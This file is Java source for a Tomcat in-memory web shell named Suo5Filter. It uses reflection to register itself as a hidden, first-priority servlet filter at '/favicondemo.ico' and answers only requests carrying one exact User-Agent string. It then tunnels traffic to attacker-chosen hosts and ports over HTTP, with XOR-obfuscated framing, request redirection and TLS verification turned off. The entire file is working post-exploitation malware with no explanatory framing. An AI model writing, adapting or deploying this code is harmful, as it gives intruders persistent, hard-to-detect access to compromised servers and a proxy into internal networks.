package com.summersec.x;


import org.apache.catalina.LifecycleState;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

import javax.net.ssl.*;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.*;
import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.*;

public class Suo5Filter extends ClassLoader implements Runnable, HostnameVerifier, X509TrustManager, Filter {
    static HashMap<String, Boolean> addrs = collectAddr();
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String path = "/favicondemo.ico";
    InputStream gInStream;
    OutputStream gOutStream;

    public Suo5Filter() {
    }
    public Suo5Filter(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
    }
    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
        } catch (Exception var3) {
        }

        return ret;
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append("ERROR:// " + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        String filterName = this.path;
        String url = this.path;
        if (servletContext.getFilterRegistration(filterName) == null) {
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;
            Field stateField = null;
            FilterRegistration.Dynamic filterRegistration = null;

            String var11;
            try {
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext)contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext)contextField.get(applicationContext);
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, (Object[])null);
                stateField.set(standardContext, LifecycleState.STARTED);
                var11 = null;

                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var21) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

                for(int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }

                String var25 = "Success";
                return var25;
            } catch (Exception var22) {
                var11 = var22.getMessage();
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            return var11;
        } else {
            return "Filter already exists";
        }
    }
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void destroy() {
    }


    public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
        HttpSession session = ((HttpServletRequest)sReq).getSession();
        Object lastRequest = sReq;
        Object lastResponse = sResp;
        if (!(lastRequest instanceof RequestFacade)) {
            Method getRequest = null;
            try {
                getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                lastRequest = getRequest.invoke(request);
                while (true) {
                    if (lastRequest instanceof RequestFacade) break;
                    lastRequest = getRequest.invoke(lastRequest);
                }
            } catch (Exception e) {
//                e.printStackTrace();
            }
        }
        // 解决包装类ResponseWrapper的问题
        try {
            if (!(lastResponse instanceof ResponseFacade)) {
                Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                lastResponse = getResponse.invoke(response);
                while (true) {
                    if (lastResponse instanceof ResponseFacade) break;
                    lastResponse = getResponse.invoke(lastResponse);
                }
            }
        }catch (Exception e) {

        }

        String agent = request.getHeader("User-Agent");
        String contentType = request.getHeader("Content-Type");

        if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
            if (chain != null) {
                chain.doFilter(sReq, sResp);
            }
            return;
        }
        if (contentType == null) {
            return;
        }

        try {
            if (contentType.equals("application/plain")) {
                tryFullDuplex(request, response);
                return;
            }

            if (contentType.equals("application/octet-stream")) {
                processDataBio(request, response);
            } else {
                processDataUnary(request, response);
            }
        } catch (Throwable e) {
//                System.out.printf("process data error %s\n", e);
//                e.printStackTrace();
        }
    }


    public void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
        int bufferOffset = 0;
        long maxTimeMillis = new Date().getTime() + timeoutMillis;
        while (new Date().getTime() < maxTimeMillis && bufferOffset < b.length) {
            int readLength = b.length - bufferOffset;
            if (is.available() < readLength) {
                readLength = is.available();
            }
            // can alternatively use bufferedReader, guarded by isReady():
            int readResult = is.read(b, bufferOffset, readLength);
            if (readResult == -1) break;
            bufferOffset += readResult;
            Thread.sleep(200);
        }
    }

    public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
        InputStream in = request.getInputStream();
        byte[] data = new byte[32];
        readInputStreamWithTimeout(in, data, 2000);
        OutputStream out = response.getOutputStream();
        out.write(data);
    }


    private HashMap newCreate(byte s) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{0x04});
        m.put("s", new byte[]{s});
        return m;
    }

    private HashMap newData(byte[] data) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{0x01});
        m.put("dt", data);
        return m;
    }

    private HashMap newDel() {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{0x02});
        return m;
    }

    private HashMap newStatus(byte b) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("s", new byte[]{b});
        return m;
    }

    byte[] u32toBytes(int i) {
        byte[] result = new byte[4];
        result[0] = (byte) (i >> 24);
        result[1] = (byte) (i >> 16);
        result[2] = (byte) (i >> 8);
        result[3] = (byte) (i /*>> 0*/);
        return result;
    }

    int bytesToU32(byte[] bytes) {
        return ((bytes[0] & 0xFF) << 24) |
                ((bytes[1] & 0xFF) << 16) |
                ((bytes[2] & 0xFF) << 8) |
                ((bytes[3] & 0xFF) << 0);
    }


    private byte[] marshal(HashMap<String, byte[]> m) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        for (String key : m.keySet()) {
            byte[] value = m.get(key);
            buf.write((byte) key.length());
            buf.write(key.getBytes());
            buf.write(u32toBytes(value.length));
            buf.write(value);
        }

        byte[] data = buf.toByteArray();
        ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
        dbuf.putInt(data.length);
        // xor key
        byte key = data[data.length / 2];
        dbuf.put(key);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ key);
        }
        dbuf.put(data);
        return dbuf.array();
    }

    private HashMap<String, byte[]> unmarshal(InputStream in) throws Exception {
        DataInputStream reader = new DataInputStream(in);
        byte[] header = new byte[4 + 1]; // size and datatype
        reader.readFully(header);
        // read full
        ByteBuffer bb = ByteBuffer.wrap(header);
        int len = bb.getInt();
        int x = bb.get();
        if (len > 1024 * 1024 * 32) {
            throw new IOException("invalid len");
        }
        byte[] bs = new byte[len];
        reader.readFully(bs);
        for (int i = 0; i < bs.length; i++) {
            bs[i] = (byte) (bs[i] ^ x);
        }
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        byte[] buf;
        for (int i = 0; i < bs.length - 1; ) {
            short kLen = bs[i];
            i += 1;
            if (i + kLen >= bs.length) {
                throw new Exception("key len error");
            }
            if (kLen < 0) {
                throw new Exception("key len error");
            }
            buf = Arrays.copyOfRange(bs, i, i + kLen);
            String key = new String(buf);
            i += kLen;

            if (i + 4 >= bs.length) {
                throw new Exception("value len error");
            }
            buf = Arrays.copyOfRange(bs, i, i + 4);
            int vLen = bytesToU32(buf);
            i += 4;
            if (vLen < 0) {
                throw new Exception("value error");
            }

            if (i + vLen > bs.length) {
                throw new Exception("value error");
            }
            byte[] value = Arrays.copyOfRange(bs, i, i + vLen);
            i += vLen;

            m.put(key, value);
        }
        return m;
    }

    private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
        final InputStream reqInputStream = request.getInputStream();
        final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
        HashMap<String, byte[]> dataMap;
        dataMap = unmarshal(reqReader);

        byte[] action = dataMap.get("ac");
        if (action.length != 1 || action[0] != 0x00) {
            resp.setStatus(403);
            return;
        }
        resp.setBufferSize(8 * 1024);
        final OutputStream respOutStream = resp.getOutputStream();

        // 0x00 create socket
        resp.setHeader("X-Accel-Buffering", "no");
        String host = new String(dataMap.get("h"));
        int port = Integer.parseInt(new String(dataMap.get("p")));
        Socket sc;
        try {
            sc = new Socket();
            sc.connect(new InetSocketAddress(host, port), 5000);
        } catch (Exception e) {
            respOutStream.write(marshal(newStatus((byte) 0x01)));
            respOutStream.flush();
            respOutStream.close();
            return;
        }

        respOutStream.write(marshal(newStatus((byte) 0x00)));
        respOutStream.flush();

        final OutputStream scOutStream = sc.getOutputStream();
        final InputStream scInStream = sc.getInputStream();

        Thread t = null;
        try {
            Suo5Filter p = new Suo5Filter(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
            readReq(reqReader, scOutStream);
        } catch (Exception e) {
//                System.out.printf("pipe error, %s\n", e);
        } finally {
            sc.close();
            respOutStream.close();
            if (t != null) {
                t.join();
            }
        }
    }

    private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
        byte[] readBuf = new byte[1024 * 8];

        while (true) {
            int n = inputStream.read(readBuf);
            if (n <= 0) {
                break;
            }
            byte[] dataTmp = Arrays.copyOfRange(readBuf, 0, 0 + n);
            if (needMarshal) {
                dataTmp = marshal(newData(dataTmp));
            }
            outputStream.write(dataTmp);
            outputStream.flush();
        }
    }

    private void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
        while (true) {
            HashMap<String, byte[]> dataMap;
            dataMap = unmarshal(bufInputStream);

            byte[] action = dataMap.get("ac");
            if (action.length != 1) {
                return;
            }
            if (action[0] == 0x02) {
                socketOutStream.close();
                return;
            } else if (action[0] == 0x01) {
                byte[] data = dataMap.get("dt");
                if (data.length != 0) {
                    socketOutStream.write(data);
                    socketOutStream.flush();
                }
            } else if (action[0] == 0x03) {
                continue;
            } else {
                return;
            }
        }
    }

    private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
            Exception {
        InputStream is = request.getInputStream();
        ServletContext ctx = request.getSession().getServletContext();
        BufferedInputStream reader = new BufferedInputStream(is);
        HashMap<String, byte[]> dataMap;
        dataMap = unmarshal(reader);


        String clientId = new String(dataMap.get("id"));
        byte[] action = dataMap.get("ac");
        if (action.length != 1) {
            resp.setStatus(403);
            return;
        }
            /*
                ActionCreate    byte = 0x00
                ActionData      byte = 0x01
                ActionDelete    byte = 0x02
                ActionHeartbeat byte = 0x03
             */
        byte[] redirectData = dataMap.get("r");
        boolean needRedirect = redirectData != null && redirectData.length > 0;
        String redirectUrl = "";
        if (needRedirect) {
            dataMap.remove("r");
            redirectUrl = new String(redirectData);
            needRedirect = !isLocalAddr(redirectUrl);
        }
        // load balance, send request with data to request url
        // action 0x00 need to pipe, see below
        if (needRedirect && action[0] >= 0x01 && action[0] <= 0x03) {
            HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
            conn.disconnect();
            return;
        }

        resp.setBufferSize(8 * 1024);
        OutputStream respOutStream = resp.getOutputStream();
        if (action[0] == 0x02) {
            OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
            if (scOutStream != null) {
                scOutStream.close();
            }
            return;
        } else if (action[0] == 0x01) {
            OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
            if (scOutStream == null) {
                respOutStream.write(marshal(newDel()));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
            byte[] data = dataMap.get("dt");
            if (data.length != 0) {
                scOutStream.write(data);
                scOutStream.flush();
            }
            respOutStream.close();
            return;
        } else {
        }

        if (action[0] != 0x00) {
            return;
        }
        // 0x00 create new tunnel
        resp.setHeader("X-Accel-Buffering", "no");
        String host = new String(dataMap.get("h"));
        int port = Integer.parseInt(new String(dataMap.get("p")));

        InputStream readFrom;
        Socket sc = null;
        HttpURLConnection conn = null;

        if (needRedirect) {
            // pipe redirect stream and current response body
            conn = redirect(request, dataMap, redirectUrl);
            readFrom = conn.getInputStream();
        } else {
            // pipe socket stream and current response body
            try {
                sc = new Socket();
                sc.connect(new InetSocketAddress(host, port), 5000);
                readFrom = sc.getInputStream();
                ctx.setAttribute(clientId, sc.getOutputStream());
                respOutStream.write(marshal(newStatus((byte) 0x00)));
                respOutStream.flush();
            } catch (Exception e) {
                ctx.removeAttribute(clientId);
                respOutStream.write(marshal(newStatus((byte) 0x01)));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
        }

        try {
            readSocket(readFrom, respOutStream, !needRedirect);
        } catch (Exception e) {
//                System.out.printf("pipe error, %s\n", e);
//                e.printStackTrace();
        } finally {
            if (sc != null) {
                sc.close();
            }
            if (conn != null) {
                conn.disconnect();
            }
            respOutStream.close();
            ctx.removeAttribute(clientId);
        }
    }

    public void run() {
        try {
            readSocket(gInStream, gOutStream, true);
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
    }

    static HashMap<String, Boolean> collectAddr() {
        HashMap<String, Boolean> addrs = new HashMap<String, Boolean>();
        try {
            Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
            while (nifs.hasMoreElements()) {
                NetworkInterface nif = nifs.nextElement();
                Enumeration<InetAddress> addresses = nif.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    String s = addr.getHostAddress();
                    if (s != null) {
                        // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
                        int ifaceIndex = s.indexOf('%');
                        if (ifaceIndex != -1) {
                            s = s.substring(0, ifaceIndex);
                        }
                        addrs.put(s, true);
                    }
                }
            }
        } catch (Exception e) {
//                System.out.printf("read socket error, %s\n", e);
//                e.printStackTrace();
        }
        return addrs;
    }

    boolean isLocalAddr(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        return addrs.containsKey(ip);
    }

    HttpURLConnection redirect(HttpServletRequest request, HashMap<String, byte[]> dataMap, String rUrl) throws Exception {
        String method = request.getMethod();
        URL u = new URL(rUrl);
        HttpURLConnection conn = (HttpURLConnection) u.openConnection();
        conn.setRequestMethod(method);
        conn.setConnectTimeout(3000);
        conn.setReadTimeout(0);
        conn.setDoOutput(true);
        conn.setDoInput(true);

        // ignore ssl verify
        // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
        if (HttpsURLConnection.class.isInstance(conn)) {
            ((HttpsURLConnection) conn).setHostnameVerifier(this);
            SSLContext ctx = SSLContext.getInstance("SSL");
            ctx.init(null, new TrustManager[]{this}, null);
            ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
        }

        Enumeration<String> headers = request.getHeaderNames();
        while (headers.hasMoreElements()) {
            String k = headers.nextElement();
            conn.setRequestProperty(k, request.getHeader(k));
        }

        OutputStream rout = conn.getOutputStream();
        rout.write(marshal(dataMap));
        rout.flush();
        rout.close();
        conn.getResponseCode();
        return conn;
    }

    public boolean verify(String hostname, SSLSession session) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}